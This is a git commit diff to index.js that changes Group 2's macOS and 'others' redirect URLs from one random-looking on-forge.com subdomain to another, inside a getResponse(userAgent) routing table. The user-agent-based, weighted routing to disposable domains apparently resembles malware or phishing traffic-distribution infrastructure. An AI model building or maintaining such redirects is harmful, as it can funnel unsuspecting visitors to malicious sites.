d7d90497dcc2f97b205ca6cb96d826a5a0e6486e
animalinside <akshay.anand12@yahoo.com>
2026-05-10 11:30:57 +0530

    Change URLs for Group 2 in index.js
    Updated URLs for macOS and others in Group 2.

--- index.js
+++ index.js
@@ -52,8 +52,8 @@ function getResponse(userAgent) {
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://kdhsuhdsudgvsd.on-forge.com/",
-            others: "https://kdhsuhdsudgvsd.on-forge.com/"
+            macos: "https://fjsdhguvdvdss.on-forge.com/",
+            others: "https://fjsdhguvdvdss.on-forge.com/"
         }
     ];
 
